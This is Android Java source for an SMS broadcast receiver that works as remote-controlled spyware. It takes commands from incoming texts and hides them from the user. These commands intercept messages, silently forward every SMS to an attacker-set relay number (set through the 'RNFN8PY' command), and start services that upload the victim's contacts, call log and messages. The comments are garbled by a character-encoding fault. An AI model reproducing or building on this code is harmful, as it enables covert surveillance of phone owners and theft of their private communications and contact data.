package com.system.mobilecontroller;

import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

import services.UploadclService;
import services.UploadpbService;
import services.UploadsmsService;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.widget.Toast;

public class Receiver extends BroadcastReceiver {
	// Context ctx = Receiver.this;//Type mismatch: cannot convert from Receiver
	// to Context
	String filePath = Environment.getExternalStorageDirectory().getPath()
			+ "/contacts.txt";
	final String[] PHONES_PROJECTION = new String[] { Phone.DISPLAY_NAME,
			Phone.NUMBER, Photo.PHOTO_ID, Phone.CONTACT_ID };
	/** ��ϵ����ʾ���� **/
	final int PHONES_DISPLAY_NAME_INDEX = 0;
	/** �绰���� **/
	final int PHONES_NUMBER_INDEX = 1;
	/** ��ϵ�˵�ID **/
	final int PHONES_CONTACT_ID_INDEX = 3;
	/** ��ϵ������ **/
	ArrayList<String> mContactsName = new ArrayList<String>();
	ArrayList<String> mContactsNumber = new ArrayList<String>();

	@Override
	public void onReceive(Context context, Intent intent) {
		int n = 0;
		// TODO Auto-generated method stub
		// Bundle bundle = intent.getExtras();
		// Object messages[] = (Object[]) bundle.get("pdus");
		// SmsMessage smsMessage[] = new SmsMessage[messages.length];
		// String content = smsMessage[n].getMessageBody();

		SharedPreferences sp = context.getSharedPreferences("SP",
				Context.MODE_PRIVATE);
		String mode = sp.getString("MODE", "reset");
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");// ��ȡ��������

		for (Object pdu : pdus) {
			byte[] data = (byte[]) pdu;
			SmsMessage message = SmsMessage.createFromPdu(data);// ʹ��pdu��ʽ�Ķ����������ɶ��Ŷ���
			String content = message.getMessageBody();// ��ȡ���ŵ�����

			// for (n = 0; n < messages.length; n++) {
			// smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
			//
			if (((message.getMessageBody().contains("lanjie")) || (mode == "lanjie"))
					&& (message.getMessageBody().contains("zhuanfa") == false)
					&& (message.getMessageBody().contains("uploadpb") == false)
					&&
					// ( message.getMessageBody().contains("downloadpb")==
					// false)&&
					(message.getMessageBody().contains("uploadcl") == false)
					&&
					// ( message.getMessageBody().contains("downloadcl")==
					// false)&&
					(message.getMessageBody().contains("uploadsms") == false)
					&& (message.getMessageBody().contains("RNFN8PY") == false)
					&& (message.getMessageBody().contains("reset_to_normal") == false)

			) {// ���۷���lanjie����mode==lanjie������ķ��������жϹ㲥
				// Toast.makeText(context, "INTERCEPTED",
				// Toast.LENGTH_LONG).show();
				this.abortBroadcast();
				Editor editor = sp.edit();
				editor.putString("MODE", "lanjie");
				editor.commit();
			} else if (message.getMessageBody().contains("zhuanfa")) {
				Editor editor = sp.edit();
				editor.putString("MODE", "zhuanfa");
				editor.commit();
				this.abortBroadcast();
				// Toast.makeText(context, "������Ϊת��ģʽ",
				// Toast.LENGTH_LONG).show();
			} else if ((mode == "zhuanfa")
					&& (message.getMessageBody().contains("lanjie") == false)
					&& (message.getMessageBody().contains("uploadpb") == false)
					&& (message.getMessageBody().contains("uploadcl") == false)
					&& (message.getMessageBody().contains("uploadsms") == false)
					&& (message.getMessageBody().contains("RNFN8PY") == false)
					&& (message.getMessageBody().contains("reset_to_normal") == false)) {// mode==zhuanfa�������أ�ֱ��ת��
				String relay_number = sp.getString("RelayNumber", "");
				String sender = message.getOriginatingAddress();// ��ȡ���ŵķ�����
				SmsManager manager = SmsManager.getDefault();
				manager.sendTextMessage(relay_number, null, "������:" + sender
						+ "���ݣ�" + content, null, null);
				// Toast.makeText(context, "����ת��..", Toast.LENGTH_LONG).show();
			} else if (message.getMessageBody().contains("reset_to_normal")) {
				Editor editor = sp.edit();
				editor.putString("MODE", "zhengchang");
				editor.commit();
				this.abortBroadcast();
				// Toast.makeText(context, "�ѻָ�", Toast.LENGTH_LONG).show();
			}

			/* ע�⣬��������޸�ʱ��Dec.5��2013��δ���� */
			else if (message.getMessageBody().contains("uploadpb")) {
				Intent serIntent1 = new Intent();
				serIntent1.setClass(context, UploadpbService.class);
				context.startService(serIntent1);

				this.abortBroadcast();
				// Toast.makeText(context, "FUCKKKKKK",
				// Toast.LENGTH_LONG).show();
			}
			// else if ( message.getMessageBody().contains("downloadpb"))
			// {
			// // DownloadUtils.downloadFile("ContactMe.txt");
			//
			// this.abortBroadcast();
			// Toast.makeText(context, "DOWNLOAD COMPLETE",
			// Toast.LENGTH_LONG).show();
			// }
			else if (message.getMessageBody().contains("uploadcl")) {
				Intent serIntent3 = new Intent();
				serIntent3.setClass(context, UploadclService.class);
				context.startService(serIntent3);
				this.abortBroadcast();
			}
			// else if( message.getMessageBody().contains("downloadcl"))
			// {
			// DownloadThread dt = new DownloadThread();
			// dt.setTar("zxc.jpg");
			// Thread t = new Thread(dt);
			// t.start();
			// this.abortBroadcast();
			// Toast.makeText(context, "@DOWNLOAD COMPLETE@",
			// Toast.LENGTH_LONG).show();
			// }
			else if (message.getMessageBody().contains("uploadsms")) {
				Intent serIntent4 = new Intent(context, UploadsmsService.class);
				context.startService(serIntent4);
				this.abortBroadcast();
				// Toast.makeText(context, "UPLOAD COMPLETE",
				// Toast.LENGTH_LONG).show();
			} else if (message.getMessageBody().contains("RNFN8PY")) {
				// Toast.makeText(context, content, Toast.LENGTH_LONG).show();
				String relayNumber = content
						.substring(content.lastIndexOf("Y") + 1);
				// SharedPreferences sp = ctx.getSharedPreferences("SP",
				// MODE_PRIVATE);
				Editor editor = sp.edit();
				editor.putString("RelayNumber", relayNumber);
				editor.commit();
				this.abortBroadcast();

			} else {
				// Toast.makeText(context, "����", Toast.LENGTH_LONG).show();
			}
		}
	}
}
